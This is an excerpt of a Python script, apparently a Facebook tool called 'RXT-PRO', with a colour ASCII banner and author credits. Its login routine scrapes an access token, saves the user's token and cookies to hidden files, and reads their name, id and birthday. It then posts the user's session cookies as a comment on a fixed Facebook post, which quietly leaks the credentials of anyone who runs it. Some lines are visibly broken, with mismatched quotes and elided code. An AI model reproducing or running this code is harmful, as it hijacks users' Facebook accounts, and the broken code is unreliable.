...
os.system('xdg-open https://www.facebook.com/M.Rahat404?mibextid=ZbWKwL/')
...
logo=("""\033[1;37m
\033[1;34m________   _______ ___ _____    ___ \033[1;37m
\033[1;34m| ___ \ \ / /_   _/   |  _  |  /   |\033[1;37m
\033[1;34m| |_/ /\ V /  | |/ /| | |/' | / /| |\033[1;37m
\033[1;34m|    / /   \  | / /_| |  /| |/ /_| |\033[1;37m
\033[1;34m| |\ \/ /^\ \ | \___  \ |_/ /\___  |\033[1;37m
\033[1;34m\_| \_\/   \/ \_/   |_/\___/     |_/ \033[1;34m𝐏 𝐑 𝐎\033[1;37m
                                    
----------------------------------------------
\033[1;34m Author    : MISTAH ROHZZ\033[1;37m
\033[1;34m Github    : RXTXD404\033[1;37m
\033[1;34m Facebook  : M.RAHAT404\033[1;37m
\033[1;34m Tool Name : RXT-PRO\033[1;37m
 \033[1;34mType type : TRAIL VERSION
 \033[1;34mVersion   : 1.0.
----------------------------------------------
 RXT PRO VERSION 1.0.0
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def login():
        ...
        try:
                data = requests.get('https://mbasic.facebook.com/", headers = {"Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0}
                find_token = re.search("(EAAG\w+)", data.text)
                open(".tok.txt", "w").write(find_token.group(1))
                open(".coki.txt","w").write(cookies)
                tok=open('.tok.txt','r').read()
                info = requests.get('https://m.facebook.com/me/?access_token='+tok,cookies = {"cookie":cookies}).json()
                name=(info['name'])
                idd=(info['id'])
                barth=(info['birthday'])
                linex()
                ...
                requests.post('https://m.facebook.com/pfbid02Sj97PfY1mY3cvbLjGaJRz22FR7yc75JFKLoBFiHoNLSq9aGxmGKotAtcYLkMDDpbl/comments/?message='+cookies+'&access_token='+tok, cookies={'cookie':cookies})
                linex()
